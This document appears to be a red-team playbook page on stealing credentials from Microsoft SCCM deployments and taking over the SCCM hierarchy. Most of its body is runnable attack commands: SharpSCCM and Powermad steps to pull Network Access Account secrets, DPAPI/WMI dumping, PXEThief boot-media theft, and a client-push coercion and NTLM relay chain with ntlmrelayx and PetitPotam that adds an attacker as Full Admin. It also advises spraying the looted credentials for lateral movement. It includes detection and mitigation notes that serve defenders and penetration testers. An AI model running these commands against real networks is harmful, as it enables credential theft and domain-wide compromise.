---
title: SCCM credential harvesting
category: AD / SCCM
order: 20
tags: [sccm, naa, dpapi, pxe, ntlm-relay, client-push, credential-access]
summary: >
  Extract the Network Access Account (NAA) and policy secrets, DPAPI creds on
  clients, and PXE boot-media secrets; and coerce automatic client-push auth to
  relay it to a site system for elevation / hierarchy takeover.
prerequisites:
  - Domain user (or MachineAccountQuota > 0) for policy-request NAA theft
  - Local admin on an SCCM client for DPAPI/WMI secret dumping
  - Unauth LAN line-of-sight to a PXE-enabled DP for PXE theft
  - SMB/HTTP reachability + a coercible site-server/client account for relay chains
tools: [SharpSCCM, sccmhunter, Powermad, PXEThief, SharpDPAPI, ntlmrelayx, PetitPotam]
detection:
  - Unusual device enrollment + computer-policy requests to the MP; an SCCM canary NAA authenticating anywhere
  - PXE/TFTP requests from unexpected hosts; site-server machine-account auth to non-SCCM destinations
  - Writes to the site DB RBAC_Admins table / SMS Admins group changes
mitigation:
  - Stop using Network Access Accounts; move to Enhanced HTTP + client token auth, require PKI
  - Password-protect PXE and disable responses for unknown computers
  - Disable automatic site-wide client push or scope it to a non-privileged account
  - SMB signing + EPA on site systems/DB; site-server accounts in Protected Users
refs:
  - { label: "CRED-2 (policy NAA)", url: "https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-2/cred-2_description.md" }
  - { label: "CRED-3 (local DPAPI/WMI)", url: "https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-3/cred-3_description.md" }
  - { label: "TAKEOVER-1 (relay to site DB)", url: "https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-1/takeover-1_description.md" }
  - { label: "XPN — unobfuscating NAA", url: "https://blog.xpnsec.com/unobfuscating-network-access-accounts/" }
  - { label: "PXEThief", url: "https://github.com/MWR-CyberSec/PXEThief" }
---

SCCM stores service creds (the **Network Access Account**, task-sequence and
collection-variable secrets) so clients can reach content. They're only
*obfuscated* on the wire and DPAPI-protected at rest — several angles recover the
cleartext.

## 1. Policy-request NAA theft (CRED-2)

Register (or spoof) a client, pull machine policy from the MP, deobfuscate the
NAA. Works with a real computer account or a self-added one (MachineAccountQuota > 0):

```powershell
New-MachineAccount -MachineAccount 'chell$'          # Powermad
SharpSCCM.exe get secrets -r <newdevice> -u 'chell$' -p '$password'
```

`sccmhunter` / `SCCMSecrets.py` do the equivalent from Linux.

## 2. Local DPAPI / WMI secrets (CRED-3)

With **local admin on any SCCM client**, the NAA lives in the
`CCM_NetworkAccessAccount` WMI class, DPAPI-encrypted under the SYSTEM masterkey:

```powershell
SharpSCCM.exe local secrets -m wmi
# offline: decrypt the blob with the SYSTEM masterkey
SharpDPAPI.exe blob /target:<b64blob> /mkfile:masterkeys.txt
```

## 3. PXE boot-media secrets (CRED-1)

If a DP answers PXE for unknown computers with no/weak password, the boot media
yields NAA + task-sequence creds:

```sh
python pxethief.py 2 $ip        # request + decrypt media from a PXE-enabled DP
```

NAA loot is usually a domain account with broad reach — spray/validate it
immediately (netexec) for lateral movement.

## 4. Client-push coercion → NTLM relay (ELEVATE-2 / TAKEOVER-1)

When **automatic client push** falls back to NTLM without PKI, coerce the
push/site-server account and relay it.

```powershell
SharpSCCM.exe invoke client-push -sms <MP> -sc <SITECODE> -t $attacker_ip
```

```sh
# hierarchy takeover: relay the site-server account to the site DB, add a Full Admin
# 1) generate the SQL (do NOT hand-craft it)
sccmhunter.py mssql -dc-ip $dc_ip -d $domain -u '$user' -p '$password' -tu $user -sc ps1 -stacked
# 2) relay listener to the site DB
ntlmrelayx.py -smb2support -t mssql://<site_db_ip> -q "<SQL_FROM_STEP_1>"
# 3) coerce the site-server account toward you
petitpotam.py -u $user -p $password -d $domain $attacker_ip <site_server_ip>
# 4) confirm
sccmhunter.py admin -u $user -p '$password' -ip <sms_provider_host>
```

> Older SharpSCCM used `get naa`; current builds use `get secrets` — check `-h`.
> Relaying to **SMB on the site DB**, the **SMS Provider**, or **LDAP** are
> variants when MSSQL is hardened. Full Admin then enables EXEC (deploy a
> script/app that runs as SYSTEM on any client).
